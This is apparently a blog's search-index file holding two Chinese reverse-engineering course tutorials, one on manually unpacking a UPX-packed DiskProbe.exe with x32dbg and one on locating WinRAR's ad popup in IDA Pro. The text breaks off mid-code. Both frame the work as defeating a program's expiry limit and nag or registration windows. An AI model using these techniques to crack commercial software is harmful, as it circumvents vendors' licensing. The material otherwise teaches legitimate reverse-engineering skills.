<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>使用ESP定律脱壳实验</title>
    <link href="/2024/10/24/111/%E4%BD%BF%E7%94%A8ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3%E5%AE%9E%E9%AA%8C/"/>
    <url>/2024/10/24/111/%E4%BD%BF%E7%94%A8ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="实验：使用ESP定律脱壳实验"><a href="#实验：使用ESP定律脱壳实验" class="headerlink" title="实验：使用ESP定律脱壳实验"></a>实验：使用ESP定律脱壳实验</h1><h2 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h2><ol><li><p>通过实验理解ESP定律基本原理及其应用</p></li><li><p>掌握PE文件分析常用工具的使用</p></li><li><p>掌握UPX壳手动脱壳方法</p></li><li><p>掌握x32dbg调试工具硬件断点的使用方法</p></li></ol><h2 id="二、实验环境："><a href="#二、实验环境：" class="headerlink" title="二、实验环境："></a>二、实验环境：</h2><p>操作系统：Windows 7&#x2F;8&#x2F;10</p><p>实验对象：<a href="http://172.17.200.225/gyf/Malware/DiskProbe.exe">DiskProbe.exe</a></p><p>实验软件：<a href="http://172.17.200.225/gyf/Malware/ExeinfoPE%20v0.0.6.1%20II.zip">ExeinfoPE</a>，<a href="http://172.17.200.225/gyf/Malware/x96dbg.zip">x32dbg</a></p><h2 id="三、实验内容："><a href="#三、实验内容：" class="headerlink" title="三、实验内容："></a>三、实验内容：</h2><h3 id="1-实验背景"><a href="#1-实验背景" class="headerlink" title="1. 实验背景"></a>1. 实验背景</h3><p>​        软件逆向工程和恶意代码分析过程中，经常分析到经过<strong>加壳</strong>的PE文件，因此必须首先进行<strong>脱壳</strong>操作。加壳和脱壳是相反的两种操作，加壳是对PE文件数据进行变换操作，从而实现对文件数据的压缩或加密操作；而脱壳则是加壳的逆向操作，就是将加壳的程序数据还原到加壳之前的原始数据状态。为了能够让加了壳的程序正常运行（操作系统的PE加载机制并不能识别加了壳以后的数据），加壳后的程序在运行时会先进行自身脱壳，然后再执行原始的程序。这个特性也是下文中采用手动的方式脱壳的基本思路来源。</p><p>​        加壳操作一般使用专用的加壳程序实现对目标程序的加壳，而脱壳相对比较复杂。在实际工作中，先使用工具软件查出壳的类型，比如ExeinfoPE工具，然后再使用对应的脱壳程序进行自动化脱壳，此类方法的关键是准确判断加壳类型并找到对应的脱壳程序，操作相对简单，这里不进行介绍。</p><p>​        如果遇到比较特殊的某种“壳”，或无法使用工具自动脱壳的时候，可以采用人工手动脱壳方法，本次实验就是介绍了一种手动脱壳技术，基于ESP定律的脱壳。实验主要使用动态调试工具，如ollydbg或x96dbg（软件包含x64dbg和x32dbg，分别针对64位和32位的程序）等工具，通过动态分析，获得程序<strong>真实的入口代码地址OEP（Original Entry Point）</strong>，最后使用相关工具将内存中的程序保存到文件中，实现最终的脱壳操作。</p><blockquote><p>​        加壳后的软件在运行时，必须先将加了可的代码指令“解密&#x2F;释放”到内存中，这时只要找到指令的起点，即OEP地址，那么就可以使用一些工具软件将内存中已经“解密”的程序转存（dump）出来，保存在本地文件，实现了脱壳。转存过程中涉及到PE格式修复，地址重定位修改等一系列操作，通常都是使用工具软件自动完成。</p></blockquote><h3 id="2-实验内容"><a href="#2-实验内容" class="headerlink" title="2. 实验内容"></a>2. 实验内容</h3><p>​        实验目标程序一款磁盘文件系统检测和数据恢复软件。软件作者在软件的编写过程中对程序执行的时间做了限制，如果系统时间超过了设定的期限，程序将显示提示信息并退出程序，如图 1所示。</p><p><img src="http://wxjb.jspi.cn/g/query/b3bcda5c-59b5-4ae0-8cc7-0d0e2707887d" alt="程序执行时间限制"></p><center>图 1 程序执行时间限制</center><p>​        为了实现破解该软件的升级提示对话框，首先要对目标进行脱壳。本次实验就是通过学习使用动态调试工具，利用ESP栈平衡定律实现对加壳的软件进行脱壳操作,最终得到脱壳后的DiskProbe.exe。</p><h2 id="四、实验步骤："><a href="#四、实验步骤：" class="headerlink" title="四、实验步骤："></a>四、实验步骤：</h2><h3 id="1-PE文件基本信息分析。"><a href="#1-PE文件基本信息分析。" class="headerlink" title="1. PE文件基本信息分析。"></a>1. PE文件基本信息分析。</h3><p><img src="http://wxjb.jspi.cn/g/query/4cc1fc8f-e841-4999-9dd9-4d6b3de2e861" alt="ExeinfoPE工具"></p><center>图 2 使用ExeinfoPE工具检查“壳”的类型</center> <p>​        为了实现对PE文件的逆向分析和破解，通常首先需要获得PE文件的一些基本信息，如图 2所示的界面中，对DiskProbe.exe分析，发现其文件经过了UPX软件的压缩加壳，软件初步分析给出加壳软件版本是0.50-0.72。单击旁边<strong>“Scan&#x2F;t”</strong>按钮，分析结果为UPX 0.70。</p><blockquote><p>​        图2中可以看到diskprobe.exe程序OEP是0007c037H，代码入口点所在的节是UPX2等信息。这里UPX实际上是使用UPX加壳软件加壳后的软件的一个节的名称，具有很明显的特征性。这里查看到的OEP是加壳以后的程序运行的程序开始点，而不是程序真实的OEP，脱壳过程就是要找的这个OEP。</p></blockquote><h3 id="2-手动脱壳基本原理"><a href="#2-手动脱壳基本原理" class="headerlink" title="2. 手动脱壳基本原理"></a>2. 手动脱壳基本原理</h3><p>​        实践工作中会使用脱壳软件实现自动化脱壳,快捷方便效率高，如本题目可以使用LinxerUnpacker实现全自动脱壳。但本次实验目标是通过使用手动脱壳加深对脱壳的一般过程的理解。</p><p>​        手动脱壳通常的关键是找到软件OEP（Original Entry Point）也就是加壳的软件中真正的软件执行的代码起点，又称“原始代码入口点”。按照查找OEP的方法可以将手动脱壳分为“手动单步跟踪法”、“ESP定律方式”和“内存二次断点法”。</p><p>​        本文重点采用ESP定律法进行脱壳操作。</p><h4 id="（1）手动单步跟踪法"><a href="#（1）手动单步跟踪法" class="headerlink" title="（1）手动单步跟踪法"></a>（1）手动单步跟踪法</h4><p>​        手动单步追踪法是使用调试器的单步调试，如使用调试器的动态调试功能，如快捷键F8（单步执行）和F4（执行到指定位置）。通过对反编译代码的分析和执行，查找OEP。这种方式的缺点是效率低下，对分析人员的综合能力要求较高。</p><h4 id="（2）内存二次断点法"><a href="#（2）内存二次断点法" class="headerlink" title="（2）内存二次断点法"></a>（2）内存二次断点法</h4><p>​        内存二次断点法是利用经过加壳的程序在执行的时候需要分别解压缩不同区段(Segment)中内容，按照解压缩的先后顺序的特点，通过分别在资源段和代码段添加断点的方式，通过2次断点，就能确定OEP的大概位置。</p><ul><li>首先在资源段上下一个断点，那么在解压缩代码的时候，程序依旧可以正常的运行，因为是先解压缩代码再解压缩资源的。当开始解压缩资源的时候，程序就会中断下来，因为已经在资源段上下了一个断点，此时中断的时候，代码已经全部解压，资源段正在准备解压…</li><li>然后在代码段上下一个断点，再继续运行，此时程序开始解压缩资源和其他的一些内容，等到全部解压缩完成以后，解压缩程序就需要跳转到OEP上运行，即跳转到代码段上运行，此时中断下来。</li><li>最后手动F8往下跟几步，就到达跨段跳转到OEP的指令位置。</li></ul><h4 id="（3）ESP定律法"><a href="#（3）ESP定律法" class="headerlink" title="（3）ESP定律法"></a>（3）ESP定律法</h4><p>​        ESP定律方式相对以上的方式更方便高效，因此本次实验将采用这个方法。</p><ul><li>什么是ESP定律？</li></ul><p>​        每一个函数的调用在堆栈里都必须开辟一个栈帧，而这个栈帧是建立在原有的栈基础上的，所以当代码执行进入函数的时候，开辟新的栈帧前必须将原来的栈信息进行保存。</p><img src="http://wxjb.jspi.cn/g/query/edf7b1db-bbe3-445f-beaa-3229e28880c9" alt="The-layout-of-function-stack-frames" style="zoom:67%;" /><center>图3 栈帧在内存中布局</center><p>​        如图3所示的栈帧布局中，新开辟的栈帧是叠加在原来函数栈帧”上“面的。为了后面的描述方便，“上”面的函数栈帧这里成为子函数栈帧或被调用函数栈帧，“下面”的栈帧称为父函数栈帧或调用函数栈帧。实际以上的描述也表明了以上2个栈帧以及函数之间调用关系。</p><blockquote><p>注意：ESP寄存器值指向当前栈的栈顶，EBP寄存器指向当前栈的栈底。一般使用[ESP+4]表示ESP向栈底方向移动4字节的栈中的数值。图3中，_stack frame of calling function:源栈帧；stack of called function:被调用函数开辟的新栈帧_。 </p></blockquote><p>​        被调用函数的栈帧在“上面”，调用函数栈帧在“下面”。当代码执行从调用函数进入被调用函数时，在被调用函数（called function）中需要执行一条PUSH EBP指令，将调用函数（calling function）的EBP保存在栈中，如图3中EBP是被调用栈帧的栈底，并指向了调用栈的栈底。请同学们思考为什么只需要将EBP入栈保存，而不需要保存ESP？</p><p>​        在函数退出前，函数的栈需要还原到函数调用之前的状态，这通常会执行对栈的逆向操作。也就是当前函数返回前，必须使用一系列的指令让ESP指向图3中EBP位置，然后会执行一个POP EBP指令，这样就能还原EBP和ESP的数值，然后在执行函数最后的ret返回指令，就能使用栈低的返回地址完全退出子函数。</p><p>​        在以上函数进入以及函数退出的过程中，分别对EBP执行了PUSH和POP操作。而这两个操作的时候，ESP寄存器的值时相等的。也就是说函数执行前后的栈是“平衡”的。更通俗的说就是函数执行前ESP会指向一个值，函数执行完毕后ESP也应该重新指向这个数值。</p><p>​        而经过加壳的程序在运行时，类似是先调用了脱壳函数，然后再执行脱壳后的代码。所以只要重点关注ESP的两次访问，就能确定脱壳函数的调用，从而找到脱壳后的代码。</p><ul><li>如何使用ESP定律？</li></ul><p>​        由ESP定律的原理可得到函数执行完成后，ESP指针会进行还原为先前的状态（第二次指向栈中某个位置）。因此可以对ESP寄存器下一个硬件断点，使得ESP还原为调用函数之前状态的时候触发中断，代码中段的位置就是“壳”的解压缩的函数执行完毕的位置，这样就能方便的得到已经”脱壳“的程序代码在内存中的位置。</p><blockquote><p>​        假设将一个壳的解压缩的方式当作一个函数的调用。如经过UPX加壳的程序在运行的时候，使用调试器能较为方便的找到UPX解压缩的函数，此时它会保存EBP，然后移动ESP，给函数留出足够的栈帧，当所有的解压缩完成后，它需要把所有的栈帧再进行还原，使得ESP恢复为调用函数之前的状态，此时会触发以上所述的硬件断点，而代码中断的位置正好为解压缩函数执行结束位置，而解压缩完成后，就会进行跳转到OEP，此时我们只需要F8（单步执行）往下跟几步，就能很快的找到OEP了！</p></blockquote><ul><li>为什么需要使用ESP定律？</li></ul><p>​        经过加壳的程序，在运行时首先会调用自身的”解密程序“实现脱壳操作，然后在执行经过”解密“的原始程序的代码。虽然能在分析代码中找到调用解密程序call指令，但是却不太容易找到解密后执行指令的位置，这时候利用栈帧的平衡原则，使用ESP定律就能方便找到解密后的指令，继续就可以找到OEP，就能实现手动的脱壳。</p><h3 id="3-ESP定律脱壳实验步骤"><a href="#3-ESP定律脱壳实验步骤" class="headerlink" title="3. ESP定律脱壳实验步骤"></a>3. ESP定律脱壳实验步骤</h3><h4 id="（1）加载分析程序"><a href="#（1）加载分析程序" class="headerlink" title="（1）加载分析程序"></a>（1）加载分析程序</h4><p>​        打开x32dbg软件，将需要分析的程序diskprobe.exe拖入软件主窗口，此时会自动加载并进入调试分析状态。</p><p><img src="http://wxjb.jspi.cn/g/query/80e6587a-af48-4cae-8c2a-8ea7d8883ff5" alt="脱壳代码入口"></p><center>图 4 进入壳函数</center><p>​        x32dbg程序打开后默认显示的代码是系统库函数调用的代码，并不是分析的diskprobe中代码，按<code>alt+F9</code>快捷键可以快速执行到”用户代码“，也就diskprobe程序的代码。程序会停在如图4所示的代码位置，经过分析前两行的代码，推测 call diskprobe.47c04d 这段代码是进入”壳“的自释放代码入口。</p><p><img src="http://wxjb.jspi.cn/g/query/8ee4a139-9d6f-414e-8ec8-d0102711fe89" alt="调用前ESP"></p><center>图 5 查看ESP值</center><p>​        <strong>按<code>F7</code>快捷键</strong>执行一条指令，使EIP寄存器指向  call diskprobe.47c04d 这条指令，如图5。按照ESP定律，当call指令执行完毕后，必定会再次访问当前ESP所指向的栈地址，此时可以记录下栈顶也就是ESP的地址为0019FF54。</p><h4 id="（2）添加断点"><a href="#（2）添加断点" class="headerlink" title="（2）添加断点"></a>（2）添加断点</h4><p>​        对当前ESP地址加一个<strong>访问硬件断点</strong>，程序执行完对”壳“的解密后，必然会触发这个中断。x32dbg中增加硬件断点，可以直接在栈地址上单击右键，选择硬件访问断点。也可以在命令行执行以下命令添加硬件断点，在程序界面下方的命令输入栏，输入以下命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">bph esp, r, 4<br></code></pre></td></tr></table></figure><p><img src="http://wxjb.jspi.cn/g/query/4d6df311-e249-4ef8-8730-91a7abc05449" alt="中断ESP"></p><center>图6 硬件中断到函数结束</center><p>​        设置好硬件中断后，按F9继续执行代码到中断位置。注意该断点是访问断点，因此第一次中断是进入函数前，第二次中断是执行完函数，这里需要找到解密后的代码执行，所以需要查看第二次中断，如图 6所示。</p><p>注意到中断中如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asm">0047C1CF  | E9 96AFFCFF      | jmp diskprobe.44716A                    |<br>0047C1D4  | 55               | push ebp                                |<br>0047C1D5  | 50               | push eax                                |<br>0047C1D6  | 58               | pop eax                                 |<br></code></pre></td></tr></table></figure><p>其中jmp diskprobe.447167A是一个跨节（section）的长跳转，说明前面的指令一直是在解密加了壳的指令代码，而解密后的指令代码放在了另外的节中，所以执行就必须一个远距离的跨节跳转指令衔接。</p><blockquote><p>​        这里看出是跨节跳转，主要是比较当前地址和目标地址是否在同一个代码节中。而具体的节的区域，可以通过查看节表获得。比较方便的是使用PE Viewer插件查看。</p><p>本实验中，查询到 </p><table><thead><tr><th>Name</th><th>VirtualAddress</th><th>VirtualSize</th></tr></thead><tbody><tr><td>UPX0</td><td>00001000</td><td>00079000</td></tr><tr><td>UPX1</td><td>0007a000</td><td>00001266</td></tr><tr><td>UPX2</td><td>0007c000</td><td>00031b56</td></tr></tbody></table><p>​        将以上的Virtual Address加上基址0x400000,可以判定出 47C1CF在UPX2节，而跳转目标地址44716A在UPX0节中，所以是跨节长跳转。</p></blockquote><h4 id="（3）导出脱壳后程序"><a href="#（3）导出脱壳后程序" class="headerlink" title="（3）导出脱壳后程序"></a>（3）导出脱壳后程序</h4><p>​        图6程序中断在jmp指令，此时按快捷键<code>F7</code>可以单步执行到目标地址，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">0044716A  | 55               | push ebp                                |<br>0044716B  | 8BEC             | mov ebp,esp                             |<br>0044716D  | 6A FF            | push FFFFFFFF                           |<br>0044716F  | 68 48DE4400      | push diskprobe.44DE48                   |<br>00447174  | 68 D4724400      | push &lt;JMP.&amp;_except_handler3&gt;            |<br>00447179  | 64:A1 00000000   | mov eax,dword ptr fs:[0]                |<br></code></pre></td></tr></table></figure><p>​        此时判断0044716A是OEP，只需将内存中从OEP开始的内存中数据“DUMP”到文件中就可以实现脱壳。但实际dump时，必须按照PE文件的格式要求修复其中的各项数据，纯手工操作需要修改很多参数，复杂低效率，通常这些操作会使用一些工具。在x32dbg中的可以使用scally插件自动完成。</p><ul><li>Dump程序文件</li></ul><p><img src="http://wxjb.jspi.cn/g/query/d256ad2f-bf6e-4b48-bf7b-2d0a9fe6d7a5" alt="scally插件"></p><center>图7 启动scally插件</center><p>​        在x32dbg的插件菜单中选择scally插件启动，如图 7所示。在OEP中填入上一节中找到的地址。依次单击IAT Autosearch和 Get Imports按钮。</p><p><img src="http://wxjb.jspi.cn/g/query/f2283da2-3ceb-457a-998a-94eb037520fd" alt="scally运行"></p><center>图8 Scally插件</center><p>​        如果一切正常，插接显示如图8。最后单击Dump按钮将数据保存。</p><ul><li>导入并修复程序文件</li></ul><p>​        Dump出的文件需要进一步的修复才可以使用。</p><p><img src="http://wxjb.jspi.cn/g/query/49d86054-fe6a-4bd9-b8a0-1b9b4327ec58" alt="scallyfix"></p><center>图9 Fix Dump</center><p>​        点击Fix Dump按钮，然后选中上一步Dump出的文件，会自动修复保存，如图9所示，修复的文件是“DiskProbe_dump_SCY.exe”，保存在桌面文件夹中。</p><p>​        最后运行修复的文件，如果能正常打开说明手动脱壳成功。</p><h2 id="五、实验结果："><a href="#五、实验结果：" class="headerlink" title="五、实验结果："></a>五、实验结果：</h2><ol><li><p>x32dbg加载目标程序后，用户代码的第一条指令截图。</p></li><li><p>PUSHAD指令地址（          ）</p></li><li><p>第二次硬件中断的地址（            ）</p></li><li><p>OEP地址（         ）</p></li><li><p>全部脱壳后程序有（             ）个节（Section）</p></li></ol><h2 id="六、思考题："><a href="#六、思考题：" class="headerlink" title="六、思考题："></a>六、思考题：</h2><ol><li><p>如何在硬件断点后找到OEP地址？</p></li><li><p>请尝试查找专用工具对本实验中的程序进行自动化脱壳，给出实验软件截图。</p></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Winrar软件简单功能逆向分析与修改【IDA Pro动静态分析综合】</title>
    <link href="/2024/10/24/111/Winrar%E8%BD%AF%E4%BB%B6%E7%AE%80%E5%8D%95%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E6%94%B9%E3%80%90IDA%20Pro%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%BB%BC%E5%90%88%E3%80%91/"/>
    <url>/2024/10/24/111/Winrar%E8%BD%AF%E4%BB%B6%E7%AE%80%E5%8D%95%E5%8A%9F%E8%83%BD%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E6%94%B9%E3%80%90IDA%20Pro%E5%8A%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E7%BB%BC%E5%90%88%E3%80%91/</url>
    
    <content type="html"><![CDATA[<h1 id="Winrar软件简单功能逆向分析与修改——IDA-Pro动静态分析综合使用"><a href="#Winrar软件简单功能逆向分析与修改——IDA-Pro动静态分析综合使用" class="headerlink" title="Winrar软件简单功能逆向分析与修改——IDA Pro动静态分析综合使用"></a>Winrar软件简单功能逆向分析与修改——IDA Pro动静态分析综合使用</h1><p>[toc]</p><h2 id="1-问题及相关分析"><a href="#1-问题及相关分析" class="headerlink" title="1. 问题及相关分析"></a>1. 问题及相关分析</h2><p>​        WinRAR压缩软件是老牌经典解压缩软件，电脑装机必备软件之一，WinRAR支持目前绝大多数的压缩文件格式，Winrar包含强力压缩、分卷、加密和自解压模块，简单易用。WinRAR的优点在于压缩率大速度快，它能备份数据，减少E-mail 附件的大小，解压缩从 Internet 上下载的RAR、ZIP和其他格式的压缩文件，并能创建RAR和ZIP格式的压缩文件。</p><p>​        但是在国内中文网站（<a href="https://link.zhihu.com/?target=http://www.winrar.com.cn/">http://www.winrar.com.cn/</a>）和英文官方网站（<a href="https://link.zhihu.com/?target=https://www.rarlab.com/">https://www.rarlab.com/</a>）下载的简体中文版WinRAR，即使有授权文件，你会发现授权后的WinRAR还是有广告弹窗出现，使用体验大打折扣。</p><p>​        本文就以清除广告弹窗为目标，介绍IDA Pro的动静态分析中的使用。最后介绍一种简单的去除注册提示窗口的方法，可以让未注册版本具有更好的使用体验。</p><h3 id="1-1-弹窗问题分析"><a href="#1-1-弹窗问题分析" class="headerlink" title="1.1 弹窗问题分析"></a>1.1 弹窗问题分析</h3><p>​        以上所述的Winrar软件启动的弹窗界面如图1所示，软件打开后，随着主程序界面的打开过程，会弹出一个窗口打开网络上某个网址中的广告信息显示。该过程如果电脑没有连接网络，将会造成Winrar打开过程卡顿，造成使用上的极大不便。</p><p><img src="http://wxjb.jspi.cn/g/query/b225c33d-1725-4d45-933f-023fec141567" alt="广告弹窗界面"></p><center>图1 Winrar广告弹窗</center><p>​         从窗口的表现行为，初步判断这是一个<strong>非模态</strong>的Windows窗口，也可能是一个非模态的对话框，也可能是一个标准的Windows程序窗口，关于这方面的判断，主要依赖读者对Windows编程知识的了解，这里不再深入探讨，可以参考<strong>《Windows程序设计第5版珍藏版》</strong>。该书是清华大学出版社发行的一本经典的Windows编程圣经，由美Charles Petzold编写的中译本。</p><p>​        通过使用网络抓包分析工具，可以分析得到每次的弹窗都会通过网络连接到互联网上某个Web站点上的广告页面，然后显示。因此可以推测在这个Windows窗口中实现了对某个包含广告的网址的读取并显示。假设在程序的初始化阶段，能够获得这个窗口打开的代码位置，尝试去除这个窗口的调用显示，那么也许就能去除弹窗。</p><p>​        按照这个思路，必须在代码中找到调用构建弹窗的代码。如果使用静态分析，则需要大量的时间分析复杂的反汇编代码，而使用动态调试的方式则可以更有效率的分析。</p><p>动态分析要点：</p><ul><li>使用添加API断点，对目标代码进行调试代码执行，更方便的分析软件行为，例如本实验中可以使用对CreateWindowExW这个API设置断点，查找所有新建窗口的行为。</li><li>为了提高断点捕获的效率，可以使用断点的条件选项设置断点激活的条件，提高分析效率。</li></ul><h3 id="1-2-获得关键弹窗参数"><a href="#1-2-获得关键弹窗参数" class="headerlink" title="1.2 获得关键弹窗参数"></a>1.2 获得关键弹窗参数</h3><p>​        Windows程序中的一个窗口包含很多参数，可以作为窗口的区别特征。常见包括<em>窗口句柄，窗口类，窗口标题文字，窗口样式</em>等。</p><p>​        使用**Spy++**之类的窗口分析软件可以方便的获得这些参数。下图是WinRar弹窗的一些参数显示界面,使用Spy++软件查找窗口的功能，可以获得所需要的各项参数。</p><p><img src="http://wxjb.jspi.cn/g/query/7d3ccf13-135f-4486-93c5-382fb512deaf" alt="弹窗参数"></p><center>图2 Spy++软件查询窗口参数</center><blockquote><p>Spy++使用方法：</p><ul><li><p>Spy++分为32位和64位两个版本，通常在64位环境中选择使用Spy++64这个版本。</p></li><li><p>启动Spy++软件后，可以使用查找窗口的功能，即点击工具栏上望远镜图标，或使用Ctrl+F快捷键打开查找对话框。</p></li><li><p>使用鼠标选择对话框中瞄准镜，按住左键，将瞄准镜图标拖动到需要查找分析的窗口上即可。</p><p><strong>注意：如果需要获得顶层窗口，请将瞄准镜托放到窗口的标题栏上。</strong></p></li></ul></blockquote><h2 id="2-动态调试分析"><a href="#2-动态调试分析" class="headerlink" title="2. 动态调试分析"></a>2. 动态调试分析</h2><p>​        动态调试分析就是在受限控制的环境中，逐条执行分析对象代码，通过代码执行的上下文环境，配合调用指令，API，变量数值等信息，综合的分析被调试代码的功能。</p><p>通常进行动态调试分析采用工具有：</p><ul><li>ollydbg</li><li>windbg</li><li>x64dbg(x32dbg)</li><li>……</li></ul><p>​        IDA Pro作为经典的静态代码分析工具，由于其静态分析强大的光环掩盖了其同样可以进行动态分析调试的功能。并且由于动静态分析集成在同一个工具中，在动态分析的过程中，可以同时获得静态分析强大的支持，将对分析工作有更大的帮助。因此，本文以下从IDA Pro工具的这两个方面进行介绍。</p><h3 id="2-1-IDA-Pro动态调试"><a href="#2-1-IDA-Pro动态调试" class="headerlink" title="2.1 IDA Pro动态调试"></a>2.1 IDA Pro动态调试</h3><p>​        IDA Pro软件采用了可扩展方式开发，除了基本的静态分析功能，还支持通过扩展方式与常见的调试器协调工作。例如，常规的安装版本中，在“Debug”工具栏的下拉菜单中就能选择一些常见的调试器，例如windbg，Local Windows dubugger，……。</p><p><strong>注意：以下的动态调试内容以选择Local Windows Debugger进行。</strong></p><p>​        IDA Pro 启动后，通常都会显示一个“<strong>Quick start</strong>”窗口，让用户选择以前调式过的项目，或者选择“new”项目，引导用户打开新的文件进行调试；另外还可以选择“go”按钮，这样会直接打开空白的程序界面，这时只要将需要分析的程序直接拖进窗口就能进行分析。除了以上的3中方式外，还可以直接把需要调试的exe或dll文件直接拖放到IDA Pro程序的图标上，这种方式也能快速打开IDA Pro程序进行分析工作。</p><p>​        IDA Pro加载了需要分析的文件后，会不断弹出一些信息确认窗口，基本上都选择默认或者Yes按钮就可以了。只需要注意其中有一个选项目是让用户是否使用pdb调试文件，这里一般选择“否”，如果选择了“Yes”，后续会弹出对话框要求用户指定pdb格式文件路径。</p><blockquote><p>知识点：IDA Pro数据库。</p><p>​        IDA Pro打开文件后，会扫描分析文件，并将文件中的数据全部抽取出来，然后使用其特定的数据格式存储，一般会有一组文件，扩展名是类似id0,id1,id2,nam,……等格式的文件。当IDA Pro退出关闭分析的文件后，这些文件会整体打包成一个文件扩展名为idb。idb文件是IDA Pro数据库文件，IDA Pro程序可以直接加载数据库文件进行逆向代码分析，而不需要源文件。这种设计思路一方面能够方便在对分析数据内容进行标记和修改，另一方面也避免了一些病毒程序被触发执行的风险。因此当第一次打开被分析的exe或dll文件后，程序会自动的分析，并将所有的数据信息记录到数据库文件。当关闭程序的时候，会提示用户保存该数据库文件。</p></blockquote><p>IDA Pro打开后的界面，主要包括反汇编代码窗口，函数清单窗口，工具栏等。如图3所示。</p><p><img src="http://wxjb.jspi.cn/g/query/e78828d5-e1fb-42aa-adf6-dc920006a5e0" alt="IDA Pro界面"></p><center>图3 IDA Pro界面</center><h4 id="2-1-1-动态调试步骤"><a href="#2-1-1-动态调试步骤" class="headerlink" title="2.1.1 动态调试步骤"></a>2.1.1 动态调试步骤</h4><ol><li>选择调试器</li><li>设置断点</li><li>运行调试，直到断点处，程序停止。</li><li>查看并分析断点处代码</li><li>步骤2或得到调试结果退出。</li></ol><p>以下文章将详细介绍每个分析过程。</p><h4 id="2-1-2-常用快捷键"><a href="#2-1-2-常用快捷键" class="headerlink" title="2.1.2 常用快捷键"></a>2.1.2 常用快捷键</h4><p>​        调试过程就是逐条运行指令或程序代码，可以使用以下快捷键控制程序的执行：</p><ul><li>F9：启动调试，如果设置了断点，那么执行到下一个断点暂停。</li><li>F7：步进调试，逐条执行指令，每按一次该键，执行1条指令，遇到函数调用进入到函数内部逐条执行。</li><li>F8：步过调试：和F7类似，区别是当遇到函数调用指令，不会进入到函数体内部，把函数执行当作1条指令执行。</li></ul><h4 id="2-1-3-调试中的数据"><a href="#2-1-3-调试中的数据" class="headerlink" title="2.1.3 调试中的数据"></a>2.1.3 调试中的数据</h4><p>​        动态调试的核心思想是抛开复杂的静态分析，让程序运行起来，然后对程序运行的状态进行分析，比如某条指令或函数执行的时候，某个变量的数据是否是预期的值，查看某个内存中特定时候的数据等。通过调试过程中获取到的信息，验证对程序功能，实现方式，调用规则等方面的推测。因此动态调试对内存和寄存器中的数据查看分析非常重要。</p><p>​        由前面章节的学习，可知道一般的局部变量和函数传递的参数都使用当前栈帧保存的，部分函数调用规范还会使用ECX，EDX等寄存器传输参数。IDA Pro在进行动态调试时，这些数据都可以从 Stack View窗口读取到。调试时候，栈顶数据会使用高亮度表示。</p><blockquote><p>提示：常见的调用规范是 cdecl, stdcall, fastcall。微软给出支持的调用约定 <a href="https://learn.microsoft.com/zh-cn/cpp/cpp/calling-conventions">https://learn.microsoft.com/zh-cn/cpp/cpp/calling-conventions</a></p></blockquote><p>​        常见的32位操作系统下，Windows API调用采用的stdcall调用标准，因此当进入函数断点时，第一个参数应当保存在 [ESP+4], 第二个参数在[ESP+8],其他参数依次类推得到，请大家思考此时的[ESP]存放的是什么数据？</p><p>​        Windows API 通常有明确的功能性特征，比如当系统中调用了ReadFile这个API函数，就能判断代码读取了文件，也可以查询API中的参数规范，获得当前读取文件的信息。所以在软件逆向分析中，如果遇到了标准的Windows API函数调用，可以辅助对程序的功能和行为的分析。</p><p>​        以下调试过程中，为了确定是否能找到弹窗调用代码，就需要不断查看栈帧对应的参数，通过传输入的参数数据来判断当前执行到的指令是否是所期望的位置代码。</p><h3 id="2-2-动态调试查找广告弹窗"><a href="#2-2-动态调试查找广告弹窗" class="headerlink" title="2.2 动态调试查找广告弹窗"></a>2.2 动态调试查找广告弹窗</h3><p>​        经过1.2小节的分析，假设这个广告窗口是通过CreateWindowExW函数创建的。后续的工作可以围绕其相关信息开展。</p><p>​        在1.2节获得弹窗以下信息：</p><ul><li>窗口类名：RarReminder</li><li>窗口样式：16CB0000</li><li>标题文字：Winrar</li><li>……</li></ul><p>​        通过这些信息在后续的调试过程中，可以从大量的函数调用中筛选出所需要的函数调用，定位分析的关注点。以下分别从查找API函数，设置断点和调试分析这三个步骤介绍调试过程。</p><blockquote><p>​        <a href="https://learn.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-createwindowexw">CreateWindowExW</a>是User32.dll中提供的Windows API函数，提供对Windows窗口的创建功能。这里特别需要说明，常见的Windows图形化界面中，除了直接看到的窗口（Window）界面是可以由这个函数构造，其他几乎所有的图形化界面元素都是可以使用这个函数构造。比如常见的按钮，编辑框，下拉菜单等各类控件，本质上都是不同窗口类的窗口。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt;HWND <span class="hljs-title function_">CreateWindowExW</span><span class="hljs-params">(  </span><br><span class="hljs-params">DWORDdwExStyle,</span><br><span class="hljs-params">LPCWSTRlpClassName,<span class="hljs-comment">//窗口类参数，可选</span></span><br><span class="hljs-params">LPCWSTRlpWindowName,  <span class="hljs-comment">//窗口文本标题，可选</span></span><br><span class="hljs-params">DWORDdwStyle, <span class="hljs-comment">//窗口样式参数</span></span><br><span class="hljs-params"><span class="hljs-type">int</span>X, </span><br><span class="hljs-params"><span class="hljs-type">int</span>Y, </span><br><span class="hljs-params"><span 